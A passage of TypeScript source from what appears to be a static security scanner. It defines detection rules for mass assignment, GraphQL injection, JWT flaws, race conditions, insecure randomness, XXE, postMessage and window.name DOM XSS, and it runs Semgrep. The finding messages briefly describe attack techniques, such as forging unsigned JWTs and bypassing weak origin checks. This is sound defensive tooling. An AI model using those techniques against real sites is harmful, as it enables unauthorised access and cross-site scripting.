          message: `CRITICAL: Trust boundary violation - ${name} assigned from user-controlled input without validation.`,
          line: index + 1,
          column: (m.index ?? 0) + 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Trust-Boundary',
          cwe: 'CWE-501',
          confidence: 'high',
          impact: 'Attacker can escalate privileges or impersonate other users.',
          remediation: 'Always validate and verify user identity through proper authentication before setting trusted properties.',
        }));
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // ORM MASS ASSIGNMENT SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanORMMassAssignment(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    const ormPatterns = [
      /\b(\w+)\.(?:update|create|upsert|findByIdAndUpdate|findOneAndUpdate)\s*\([^,]*,\s*([^)]+)\)/i,
      /\b(\w+)\.(?:update|create|upsert)\s*\(\s*([^)]+)\s*\)/i,
    ];

    lines.forEach((line, index) => {
      for (const pattern of ormPatterns) {
        const m = pattern.exec(line);
        if (!m) continue;

        const dataArg = m[2]?.trim();
        if (!dataArg) continue;

        // Check if user-controlled data is passed directly
        const isUserControlled = /(?:req\.(?:body|query|params)|request\.(?:body|query|params))/i.test(dataArg);
        if (!isUserControlled) continue;

        // Check for field allowlisting
        const contextStr = this.getContext(ctx, index, 30);
        const hasAllowlist = /(?:pick|omit|select|fields|only|except|whitelist|allowlist)\s*\(/i.test(contextStr);

        const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index ?? 0, m[0].length);

        results.push(this.createValidatedResult({
          ruleId: 'orm-mass-assignment',
          severity: hasAllowlist ? 'warning' : 'error',
          message: hasAllowlist
            ? `ORM mass assignment: Field filtering present but verify privileged fields (isAdmin, role, etc.) are excluded.`
            : `CRITICAL: ORM mass assignment without field allowlisting. Attacker can set privileged fields.`,
          line: index + 1,
          column: (m.index ?? 0) + 1,
          file: url,
          pattern: pattern.toString(),
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Mass-Assignment',
          cwe: 'CWE-915',
          confidence: hasAllowlist ? 'medium' : 'high',
          impact: 'Attacker can set privileged fields (isAdmin, role, verified) to escalate privileges.',
          remediation: 'Use pick() to explicitly select allowed fields. Never pass request body directly to ORM methods.',
        }));
        break;
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // GRAPHQL INJECTION SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanGraphQLInjection(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    lines.forEach((line, index) => {
      if (!/graphql|gql/i.test(line)) return;

      // Check for string concatenation with user input
      if (/(\+|`|\$\{).*(req|request|body|query|params|input|variables)/i.test(line)) {
        // Skip if using proper parameterization
        if (/(variables|params|\.query\(|\.mutate\(|gql`)/i.test(line) && !/\+/.test(line)) return;

        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);

        results.push(this.createValidatedResult({
          ruleId: 'graphql-injection',
          severity: 'error',
          message: 'HIGH: GraphQL injection - user input directly concatenated into query string.',
          line: index + 1,
          column: 1,
          file: url,
          pattern: '/(\\+|`|\\$\\{).*(req|request|body|query|params|input|variables)/i',
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'GraphQL-Injection',
          cwe: 'CWE-943',
          confidence: 'high',
          impact: 'Attacker can modify GraphQL queries to access unauthorized data or bypass authorization.',
          remediation: 'Use GraphQL variables for all user input. Never concatenate strings into queries.',
        }));
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // JWT VULNERABILITIES SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanJWTVulnerabilities(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    lines.forEach((line, index) => {
      // Algorithm none attack
      if (/algorithm\s*[:=]\s*['"]none['"]/i.test(line) || 
          /alg\s*[:=]\s*['"]none['"]/i.test(line)) {
        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);
        results.push(this.createValidatedResult({
          ruleId: 'jwt-algorithm-none',
          severity: 'error',
          message: 'CRITICAL: JWT algorithm set to "none" - allows unsigned tokens.',
          line: index + 1,
          column: 1,
          file: url,
          pattern: '/algorithm\\s*[:=]\\s*[\'"]none[\'"]/i',
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'JWT-Vulnerability',
          cwe: 'CWE-327',
          confidence: 'very-high',
          impact: 'Attacker can forge JWT tokens without knowing the secret key.',
          remediation: 'Always specify a secure algorithm (RS256, ES256). Never allow "none".',
        }));
      }

      // Weak symmetric algorithms
      if (/algorithm\s*[:=]\s*['"]HS256['"]/i.test(line) && 
          /secret\s*[:=]\s*['"][^'"]{1,15}['"]/i.test(line)) {
        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);
        results.push(this.createValidatedResult({
          ruleId: 'jwt-weak-secret',
          severity: 'warning',
          message: 'JWT using HS256 with potentially weak secret. Use 256+ bit secrets or asymmetric algorithms.',
          line: index + 1,
          column: 1,
          file: url,
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'JWT-Vulnerability',
          cwe: 'CWE-326',
          confidence: 'medium',
          remediation: 'Use a cryptographically strong secret (256+ bits) or switch to RS256/ES256.',
        }));
      }

      // JWT verify without algorithm check
      if (/jwt\.verify\s*\([^)]+,\s*[^,)]+\s*\)/.test(line) && 
          !/algorithms?\s*:/i.test(line)) {
        const contextStr = this.getContext(ctx, index, 5);
        if (!/algorithms?\s*:/i.test(contextStr)) {
          const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);
          results.push(this.createValidatedResult({
            ruleId: 'jwt-no-algorithm-check',
            severity: 'warning',
            message: 'JWT verification without explicit algorithm specification - vulnerable to algorithm confusion.',
            line: index + 1,
            column: 1,
            file: url,
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: evidence.text,
            contextStartLine: evidence.startLine,
            contextEndLine: evidence.endLine,
            category: 'JWT-Vulnerability',
            cwe: 'CWE-327',
            confidence: 'medium',
            remediation: 'Always specify { algorithms: ["RS256"] } or similar in verify options.',
          }));
        }
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // RACE CONDITION SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanRaceConditions(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    // Detect TOCTOU (Time-of-Check to Time-of-Use) patterns
    const checkPatterns = [
      { check: /if\s*\(\s*.*\.exists\s*\(|fs\.existsSync\s*\(|fs\.access\s*\(/i, op: 'file existence' },
      { check: /if\s*\(\s*.*balance\s*>=|\.balance\s*>|getBalance\s*\(\s*\)\s*>/i, op: 'balance check' },
      { check: /if\s*\(\s*.*count\s*>|\.count\s*>|getCount\s*\(\s*\)\s*>/i, op: 'count check' },
      { check: /if\s*\(\s*.*stock\s*>|inventory\s*>|available\s*>/i, op: 'inventory check' },
    ];

    lines.forEach((line, index) => {
      for (const { check, op } of checkPatterns) {
        if (!check.test(line)) continue;

        // Look for corresponding operation within next 20 lines
        const followingLines = lines.slice(index + 1, Math.min(lines.length, index + 21)).join('\n');
        
        const hasFileOp = /fs\.(readFile|writeFile|unlink|rename|copy)/i.test(followingLines);
        const hasDbOp = /\.(update|save|delete|remove|decrement|increment)\s*\(/i.test(followingLines);
        const hasTransfer = /(transfer|withdraw|debit|send)\s*\(/i.test(followingLines);
        
        if ((op === 'file existence' && hasFileOp) ||
            (op === 'balance check' && (hasDbOp || hasTransfer)) ||
            (op === 'count check' && hasDbOp) ||
            (op === 'inventory check' && hasDbOp)) {
          
          // Check for transaction/lock
          const contextStr = this.getContext(ctx, index, 15);
          const hasLock = /transaction|lock|mutex|semaphore|atomic|serialize/i.test(contextStr);
          
          if (!hasLock) {
            const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);
            results.push(this.createValidatedResult({
              ruleId: 'race-condition-toctou',
              severity: 'warning',
              message: `Potential TOCTOU race condition: ${op} followed by operation without atomic transaction.`,
              line: index + 1,
              column: 1,
              file: url,
              matchedCode: evidence.text,
              matchedCodeHighlights: evidence.highlights,
              contextCode: evidence.text,
              contextStartLine: evidence.startLine,
              contextEndLine: evidence.endLine,
              category: 'Race-Condition',
              cwe: 'CWE-367',
              confidence: 'medium',
              impact: 'Attacker can exploit timing window between check and use to bypass security controls.',
              remediation: 'Use atomic operations, database transactions, or proper locking mechanisms.',
            }));
          }
        }
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // INSECURE RANDOMNESS SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanInsecureRandomness(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    lines.forEach((line, index) => {
      // Math.random() for security-sensitive operations
      if (/Math\.random\s*\(\s*\)/.test(line)) {
        const contextStr = this.getContext(ctx, index, 10);
        const isSecurityContext = /(token|secret|key|password|session|auth|nonce|salt|iv|otp|code|verify)/i.test(contextStr);
        
        if (isSecurityContext) {
          const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);
          results.push(this.createValidatedResult({
            ruleId: 'insecure-randomness',
            severity: 'error',
            message: 'Math.random() used in security-sensitive context. Not cryptographically secure.',
            line: index + 1,
            column: 1,
            file: url,
            pattern: '/Math\\.random\\s*\\(\\s*\\)/',
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: evidence.text,
            contextStartLine: evidence.startLine,
            contextEndLine: evidence.endLine,
            category: 'Insecure-Randomness',
            cwe: 'CWE-330',
            confidence: 'high',
            impact: 'Attacker can predict generated values and bypass security mechanisms.',
            remediation: 'Use crypto.randomBytes() or crypto.randomUUID() for security-sensitive random values.',
          }));
        }
      }

      // Predictable seeds
      if (/seed\s*[:=]\s*(?:Date\.now\(\)|new Date\(\)|process\.pid|\d{1,10})/.test(line)) {
        const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);
        results.push(this.createValidatedResult({
          ruleId: 'predictable-seed',
          severity: 'warning',
          message: 'Random number generator seeded with predictable value (timestamp, PID, or constant).',
          line: index + 1,
          column: 1,
          file: url,
          matchedCode: evidence.text,
          matchedCodeHighlights: evidence.highlights,
          contextCode: evidence.text,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'Insecure-Randomness',
          cwe: 'CWE-335',
          confidence: 'medium',
          remediation: 'Use crypto.randomBytes() for seeding if a PRNG is required.',
        }));
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // XXE VULNERABILITIES SCANNER
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanXXEVulnerabilities(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url } = ctx;

    lines.forEach((line, index) => {
      // XML parsing without disabling external entities
      const xmlParserPatterns = [
        /new\s+DOMParser\s*\(\s*\)/,
        /xml2js\.parse(?:String)?\s*\(/,
        /parseXML\s*\(/,
        /xmldom\.DOMParser/,
        /libxmljs\.parse(?:Xml)?\s*\(/,
        /fast-xml-parser/,
      ];

      for (const pattern of xmlParserPatterns) {
        if (!pattern.test(line)) continue;

        const contextStr = this.getContext(ctx, index, 10);
        const hasSecureConfig = /(noent|resolveExternals|external.*false|disallow.*dtd|NOENT)/i.test(contextStr);
        
        if (!hasSecureConfig) {
          // Check if parsing user input
          const hasUserInput = /(req|request|body|input|data|xml|payload)/i.test(contextStr);
          
          if (hasUserInput) {
            const evidence = this.buildEvidenceWindow(ctx, index + 1, 0, line.length);
            results.push(this.createValidatedResult({
              ruleId: 'xxe-vulnerability',
              severity: 'error',
              message: 'XML parsing without disabling external entities. Vulnerable to XXE attacks.',
              line: index + 1,
              column: 1,
              file: url,
              pattern: pattern.toString(),
              matchedCode: evidence.text,
              matchedCodeHighlights: evidence.highlights,
              contextCode: evidence.text,
              contextStartLine: evidence.startLine,
              contextEndLine: evidence.endLine,
              category: 'XXE',
              cwe: 'CWE-611',
              confidence: 'high',
              impact: 'Attacker can read local files, perform SSRF, or cause denial of service.',
              remediation: 'Disable external entities and DTD processing. Use JSON instead of XML where possible.',
            }));
            break;
          }
        }
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // POSTMESSAGE VULNERABILITY SCANNER
  // Detects insecure postMessage handling patterns (origin validation bypass, data injection)
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanPostMessageVulnerabilities(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url, taintedVars } = ctx;

    const messageHandlers: Array<{ line: number; hasOriginCheck: boolean; isStrongOriginCheck: boolean; handlerEnd: number; handlerCode: string }> = [];

    lines.forEach((line, index) => {
      const listenerMatch = /(?:addEventListener\s*\(\s*['"]message['"]|\.onmessage\s*=)/.test(line);
      if (!listenerMatch) return;

      let handlerEnd = index;
      let braceCount = 0;
      let started = false;
      for (let i = index; i < Math.min(index + 60, lines.length); i++) {
        const l = lines[i];
        for (const char of l) {
          if (char === '{') { braceCount++; started = true; }
          if (char === '}') braceCount--;
        }
        if (started && braceCount === 0) {
          handlerEnd = i;
          break;
        }
      }

      const handlerCode = lines.slice(index, handlerEnd + 1).join('\n');
      const hasOriginCheck = this.hasPostMessageOriginValidation(handlerCode);
      const isStrongOriginCheck = this.hasStrongPostMessageOriginCheck(handlerCode);
      messageHandlers.push({ line: index + 1, hasOriginCheck, isStrongOriginCheck, handlerEnd: handlerEnd + 1, handlerCode });
    });

    for (const handler of messageHandlers) {
      const usesDangerousSink = this.postMessageHandlerUsesDangerousSink(handler.handlerCode);
      const dataFlowsToSink = usesDangerousSink && (
        /(?:event|e|msg)\.data\b/i.test(handler.handlerCode) ||
        /(?:event|e|msg)\.data\s*\.\s*\w+/.test(handler.handlerCode) ||
        /(?:const|let|var)\s*\{\s*data\s*\}\s*=\s*(?:event|e|msg)/.test(handler.handlerCode) ||
        /(?:event|e|msg)\.data\s*\[/.test(handler.handlerCode)
      );
      const alreadyReportedByTaint = dataFlowsToSink && taintedVars.size > 0 &&
        Array.from(taintedVars.entries()).some(([, v]) => v.sourceName && /postMessage|event\.data/i.test(v.sourceName));

      if (alreadyReportedByTaint) continue;

      const sourceInsteadOfOrigin = this.hasSourceInsteadOfOriginCheck(handler.handlerCode);
      if (!handler.hasOriginCheck || sourceInsteadOfOrigin || (!handler.isStrongOriginCheck && dataFlowsToSink)) {
        const evidence = this.buildEvidenceWindow(ctx, handler.line, 0, Math.min(lines[handler.line - 1].length, 200));
        const snippet = this.cleanEvidenceSnippet(evidence.text, 400);
        const ruleId = sourceInsteadOfOrigin ? 'postmessage-source-instead-of-origin' : (dataFlowsToSink ? 'postmessage-data-to-sink-no-origin' : 'postmessage-no-origin-check');
        const message = sourceInsteadOfOrigin
          ? 'PostMessage validates event.source instead of event.origin (2025 bypass). Attacker can spoof window reference. Always validate event.origin against allowlist.'
          : dataFlowsToSink
            ? 'PostMessage handler passes event.data (or event.data.*) into a dangerous sink without strong origin validation. Manual: verify origin allowlist and that event.data is not rendered as HTML/script.'
            : 'PostMessage handler lacks origin validation. Add strict event.origin check before using event.data.';

        results.push(this.createValidatedResult({
          ruleId,
          severity: sourceInsteadOfOrigin || dataFlowsToSink ? 'error' : 'warning',
          message,
          line: handler.line,
          column: 1,
          file: url,
          pattern: 'addEventListener("message")',
          matchedCode: snippet,
          matchedCodeHighlights: evidence.highlights,
          contextCode: snippet,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'PostMessage-XSS',
          cwe: 'CWE-346',
          confidence: dataFlowsToSink ? 'very-high' : 'high',
          chainable: true,
          impact: 'Attacker can send messages from any origin; if event.data reaches innerHTML/eval, DOM XSS is likely.',
          remediation: 'Validate event.origin against an allowlist: if (!ALLOWED_ORIGINS.includes(event.origin)) return;',
        }));
      }
    }

    lines.forEach((line, index) => {
      const wildcardMatch = /\.postMessage\s*\([^,]+,\s*['"]\*['"]\s*\)/.exec(line);
      if (wildcardMatch) {
        const evidence = this.buildEvidenceWindow(ctx, index + 1, wildcardMatch.index, wildcardMatch[0].length);
        const snippet = this.cleanEvidenceSnippet(evidence.text, 350);
        results.push(this.createValidatedResult({
          ruleId: 'postmessage-wildcard-origin',
          severity: 'warning',
          message: 'postMessage(..., "*"): any origin can receive. Prefer explicit target origin.',
          line: index + 1,
          column: wildcardMatch.index + 1,
          file: url,
          pattern: 'postMessage(data, "*")',
          matchedCode: snippet,
          matchedCodeHighlights: evidence.highlights,
          contextCode: snippet,
          contextStartLine: evidence.startLine,
          contextEndLine: evidence.endLine,
          category: 'PostMessage-Security',
          cwe: 'CWE-346',
          confidence: 'high',
          impact: 'Sensitive data may be exposed to untrusted origins.',
          remediation: 'Use exact target origin: window.postMessage(data, "https://trusted.com")',
        }));
      }
    });
  }

  private postMessageHandlerUsesDangerousSink(handlerCode: string): boolean {
    return (
      /\.(?:inner|outer)HTML\s*=.*(?:event|e|msg)(?:\.data|\.data\.\w+)/i.test(handlerCode) ||
      /(?:event|e|msg)(?:\.data|\.data\.\w+).*\.(?:inner|outer)HTML\s*=/i.test(handlerCode) ||
      /eval\s*\([^)]*(?:event|e|msg)\.data/i.test(handlerCode) ||
      /(?:location|document\.write|insertAdjacentHTML)\s*[=(].*(?:event|e|msg)\.data/i.test(handlerCode) ||
      /new\s+Function\s*\([^)]*(?:event|e|msg)\.data/i.test(handlerCode) ||
      /(?:const|let|var)\s*\{\s*data\s*\}\s*=\s*(?:event|e|msg)[\s\S]*?\.(?:inner|outer)HTML\s*=\s*data/.test(handlerCode) ||
      /(?:event|e|msg)\.data(?:\.\w+)?[\s\S]{0,80}\.(?:inner|outer)HTML\s*=/.test(handlerCode)
    );
  }

  private hasPostMessageOriginValidation(handlerCode: string): boolean {
    const patterns = [
      /(?:event|e|msg)\.origin\s*[!=]==?\s*['"][^'"]+['"]/,
      /(?:event|e|msg)\.origin\.(?:startsWith|includes|indexOf|match)\s*\(/,
      /(?:allowedOrigins?|trustedOrigins?|whitelist|validOrigins?).*(?:event|e|msg)\.origin/i,
      /if\s*\(\s*(?:event|e|msg)\.origin\b/,
      /origin\s*!==?\s*(?:event|e|msg)\.origin/,
      /new\s+URL\s*\([^)]*(?:event|e|msg)\.origin/,
    ];
    return patterns.some(p => p.test(handlerCode));
  }

  /** Dangerous: validating event.source instead of event.origin (2025 bypass - MSRC) */
  private hasSourceInsteadOfOriginCheck(handlerCode: string): boolean {
    return /(?:event|e|msg)\.source\s*[!=]==?\s*|\.source\s*!==?\s*(?:event|e|msg)|if\s*\(\s*(?:event|e|msg)\.source\b/.test(handlerCode) &&
      !this.hasPostMessageOriginValidation(handlerCode);
  }

  /** Strong check: allowlist/equality; weak: regex, indexOf, event.source (2025-2026) */
  private hasStrongPostMessageOriginCheck(handlerCode: string): boolean {
    // event.source validation instead of origin - always weak (bypassable)
    if (this.hasSourceInsteadOfOriginCheck(handlerCode)) return false;
    if (!this.hasPostMessageOriginValidation(handlerCode)) return false;
    const weakPatterns = [
      /\.indexOf\s*\(\s*(?:event|e|msg)\.origin\s*\)\s*!==?\s*-1/,  // indexOf bypass
      /\.(?:startsWith|includes)\s*\(\s*['"][^'"]{0,10}['"]\s*\)/,  // very short prefix
      /(?:event|e|msg)\.origin\s*===\s*['"]\s*['"]/,  // empty string
      /\.(?:match|test)\s*\(\s*\/[^/]+/,  // regex validation - bypassable (example.com.attacker.com)
      /RegExp\s*\([^)]*\).*\.(?:test|exec)\s*\(\s*(?:event|e|msg)\.origin/,  // regex on origin
    ];
    if (weakPatterns.some(p => p.test(handlerCode))) return false;
    return true;
  }

  /** Trim and normalize evidence for clean manual analysis snippets. Optionally truncate each line to maxLineLen. */
  private cleanEvidenceSnippet(text: string, maxLen: number, maxLineLen?: number): string {
    let out = (text || '').trim();
    if (maxLineLen != null && maxLineLen > 0) {
      out = out.split('\n').map(line => {
        if (line.length <= maxLineLen) return line;
        return line.slice(0, maxLineLen - 1) + '…';
      }).join('\n');
    }
    if (!out || out.length <= maxLen) return out;
    const firstPart = out.slice(0, maxLen).trim();
    const lastNewLine = firstPart.lastIndexOf('\n');
    const cut = lastNewLine > maxLen / 2 ? firstPart.slice(0, lastNewLine + 1) : firstPart;
    return cut + (cut.endsWith('\n') ? '' : '\n') + '...';
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // WINDOW.NAME ABUSE SCANNER
  // Detects usage of window.name which persists across cross-origin navigations
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private scanWindowNameAbuse(ctx: DetectionContext, results: ScanResult[]): void {
    const { lines, url, taintedVars } = ctx;

    lines.forEach((line, index) => {
      // Skip minified/huge lines to avoid false positives (e.g. .innerHTML and "name" in unrelated CSS)
      const trimmed = line.trim();
      if (trimmed.length > 500) return;

      // Only explicit window.name usage in dangerous sinks (no loose \bname\b - causes FPs in minified code)
      const windowNamePatterns = [
        { pattern: /\.innerHTML\s*=.*window\.name/, sink: 'innerHTML' },
        { pattern: /\.outerHTML\s*=.*window\.name/, sink: 'outerHTML' },
        { pattern: /document\.write\(.*window\.name/, sink: 'document.write' },
        { pattern: /eval\s*\(.*window\.name/, sink: 'eval' },
        { pattern: /new\s+Function\s*\(.*window\.name/, sink: 'Function constructor' },
        { pattern: /\$\([^)]+\)\.html\s*\(.*window\.name/, sink: 'jQuery.html()' },
      ];

      for (const { pattern, sink } of windowNamePatterns) {
        const m = pattern.exec(line);
        if (m) {
          const evidence = this.buildEvidenceWindow(ctx, index + 1, m.index, m[0].length);
          
          results.push(this.createValidatedResult({
            ruleId: 'window-name-xss',
            severity: 'error',
            message: `DOM XSS via window.name: ${sink} receives window.name which persists across cross-origin navigations. Attacker can pre-seed malicious content.`,
            line: index + 1,
            column: m.index + 1,
            file: url,
            pattern: pattern.toString(),
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: evidence.text,
            contextStartLine: evidence.startLine,
            contextEndLine: evidence.endLine,
            category: 'DOM-XSS',
            cwe: 'CWE-79',
            confidence: 'very-high',
            chainable: true,
            impact: 'Attacker opens victim page with crafted window.name containing XSS payload. Name persists and gets rendered.',
            remediation: 'Never use window.name in HTML context. Sanitize with DOMPurify or use textContent.',
          }));
        }
      }

      // Implicit global "name" reference (innerHTML = name or outerHTML = name) - skip in minified lines
      const implicitNameMatch = trimmed.length <= 300 && /(?:innerHTML|outerHTML)\s*=\s*name\b(?!\s*[.=])/.exec(line);
      if (implicitNameMatch) {
        // Check if 'name' is declared locally in the file
        const hasLocalDecl = /(?:const|let|var|function)\s+name\b/.test(lines.slice(0, index).join('\n'));
        
        if (!hasLocalDecl) {
          const evidence = this.buildEvidenceWindow(ctx, index + 1, implicitNameMatch.index, implicitNameMatch[0].length);
          
          results.push(this.createValidatedResult({
            ruleId: 'implicit-window-name-xss',
            severity: 'warning',
            message: 'Potential DOM XSS: "name" resolves to window.name if not locally declared. Verify this is intentional.',
            line: index + 1,
            column: implicitNameMatch.index + 1,
            file: url,
            pattern: 'name (implicit global)',
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: evidence.text,
            contextStartLine: evidence.startLine,
            contextEndLine: evidence.endLine,
            category: 'DOM-XSS',
            cwe: 'CWE-79',
            confidence: 'medium',
            chainable: true,
            impact: 'If "name" is window.name, attacker can inject content via cross-origin navigation.',
            remediation: 'Use explicit variable declaration or window.name. Sanitize if rendering as HTML.',
          }));
        }
      }
    });
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // SEMGREP INTEGRATION
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private async runSemgrepRules(filePath: string, url: string, code: string): Promise<ScanResult[]> {
    const results: ScanResult[] = [];

    try {
      const semgrepCmd = await this.resolveSemgrepCommand();
      if (!semgrepCmd) {
        throw new Error('Semgrep not found. Install with: `pip install semgrep`');
      }

      const rulesFile = path.join(this.rulesDir, 'javascript-security.yml');
      if (!fs.existsSync(rulesFile)) {
        throw new Error(`Semgrep config not found: ${rulesFile}`);
      }

      const normalizedRulesFile = shellEscapePath(rulesFile);
      const normalizedFilePath = shellEscapePath(filePath);
      const lineOffsets = this.buildLineOffsets(code);
      
      const mb = code.length / (1024 * 1024);
      const timeout = Math.min(300, Math.max(90, 60 + Math.floor(mb) * 45));

      let stdout = '';
      const run = async (cmd: string) => {
        try {
          const execOptions: any = { maxBuffer: 50 * 1024 * 1024 };
          if (process.platform === 'win32') {
            execOptions.shell = process.env.COMSPEC || 'cmd.exe';
          }
          return await execAsync(cmd, execOptions);
        } catch (e: any) {
          if ((e?.code === 1 || e?.code === 0) && typeof e?.stdout === 'string' && e.stdout.trim()) {
            return { stdout: e.stdout, stderr: e.stderr };
          }
          throw e;
        }
      };

      let baseFlags = `--json --timeout ${timeout} --quiet --metrics=off --disable-version-check --dataflow-traces`;

      try {
        const cmd = `${semgrepCmd} --config ${normalizedRulesFile} ${normalizedFilePath} ${baseFlags}`;
        const out = await run(cmd);
        stdout = out.stdout ?? '';
      } catch (e: any) {
        const stderr = String(e?.stderr || e?.message || e || '');
        if (/unknown option|unrecognized arguments|no such option|dataflow/i.test(stderr)) {
          baseFlags = `--json --timeout ${timeout} --quiet --metrics=off --disable-version-check`;
          const cmd = `${semgrepCmd} --config ${normalizedRulesFile} ${normalizedFilePath} ${baseFlags}`;
          const out = await run(cmd);
          stdout = out.stdout ?? '';
        } else if (typeof e?.stdout === 'string' && e.stdout.trim()) {
          stdout = e.stdout;
        } else {
          // Re-throw to let outer catch block log the error details
          throw e;
        }
      }

      const output = this.extractSemgrepJson(stdout);

      if (output.results && Array.isArray(output.results)) {
        const lines = code.split('\n');
        const numLines = lines.length;
        for (const result of output.results as SemgrepResultItem[]) {
          const checkId = result.check_id;
          const start = result.start;
          if (!checkId || typeof checkId !== 'string' || !start || typeof start !== 'object') {
            continue;
          }
          const findingLine = typeof start.line === 'number' ? start.line : parseInt(String(start.line), 10) || 0;
          const findingCol = typeof start.col === 'number' ? start.col : parseInt(String(start.col), 10) || 0;
          if (findingLine <= 0 || findingCol < 0) continue;
          // Clamp line to file bounds so evidence window and highlights stay valid
          const safeLine = numLines > 0 ? Math.min(findingLine, numLines) : findingLine;

          const end = result.end;
          const endLine = end && (typeof end.line === 'number' ? end.line : parseInt(String(end.line), 10)) ? (typeof end.line === 'number' ? end.line : parseInt(String(end.line), 10)) : findingLine;
          const endCol = end && (typeof end.col === 'number' ? end.col : parseInt(String(end.col), 10)) != null ? (typeof end.col === 'number' ? end.col : parseInt(String(end.col), 10)) : findingCol;

          const extra = result.extra || {};
          const md = extra.metadata || {};
          const severity = this.mapSeverity(extra.severity);
          let confidence = this.normalizeConfidence(typeof md.confidence === 'string' ? md.confidence : undefined);
          if (confidence === 'unknown' || !confidence) {
            confidence = severity === 'error' ? 'medium' : severity === 'warning' ? 'low' : 'unknown';
          }

          const ctx: DetectionContext = {
            code,
            lines,
            lineOffsets,
            url,
            taintedVars: new Map(),
          };
          const matchLen = Math.max(1, endCol - findingCol);
          const evidence = this.buildEvidenceWindow(ctx, safeLine, Math.max(0, findingCol - 1), matchLen);

          const taintTraces: TaintTraceEntry[] = [];
          const df = extra.dataflow_trace;
          if (df && (df.taint_source || df.taint_sink)) {
            const srcLoc = df.taint_source?.location ?? df.taint_source;
            const snkLoc = df.taint_sink?.location ?? df.taint_sink;
            const src = (typeof srcLoc === 'object' && srcLoc !== null && (srcLoc as any).start) ? (srcLoc as any).start : (typeof srcLoc === 'object' && srcLoc !== null && (srcLoc as any).span) ? (srcLoc as any).span?.start : srcLoc;
            const snk = (typeof snkLoc === 'object' && snkLoc !== null && (snkLoc as any).start) ? (snkLoc as any).start : (typeof snkLoc === 'object' && snkLoc !== null && (snkLoc as any).span) ? (snkLoc as any).span?.start : snkLoc;
            if (src && typeof src.line === 'number') {
              taintTraces.push({
                type: 'source',
                line: src.line,
                column: typeof src.col === 'number' ? src.col : 0,
                description: `Tainted data source at line ${src.line}`,
              });
            }
            if (snk && typeof snk.line === 'number') {
              taintTraces.push({
                type: 'sink',
                line: snk.line,
                column: typeof snk.col === 'number' ? snk.col : 0,
                description: `Dangerous sink at line ${snk.line}`,
              });
            }
          }

          let message = (typeof extra.message === 'string' ? extra.message : null) || (typeof result.message === 'string' ? result.message : null) || checkId;
          if (!message || !String(message).trim()) message = checkId;
          results.push(this.createValidatedResult({
            ruleId: checkId,
            severity,
            message,
            line: findingLine,
            column: findingCol,
            file: url,
            pattern: (typeof md.pattern === 'string' ? md.pattern : undefined) || checkId,
            matchedCode: evidence.text,
            matchedCodeHighlights: evidence.highlights,
            contextCode: evidence.text,
            contextStartLine: evidence.startLine,
            contextEndLine: evidence.endLine,
            category: typeof md.category === 'string' ? md.category : undefined,
            cwe: typeof md.cwe === 'string' ? md.cwe : undefined,
            owasp: typeof md.owasp === 'string' ? md.owasp : undefined,
            frameworks: Array.isArray(md.frameworks) ? md.frameworks : undefined,
            confidence,
            remediation: typeof md.remediation === 'string' ? md.remediation : typeof md.fix === 'string' ? md.fix : typeof md.recommendation === 'string' ? md.recommendation : undefined,
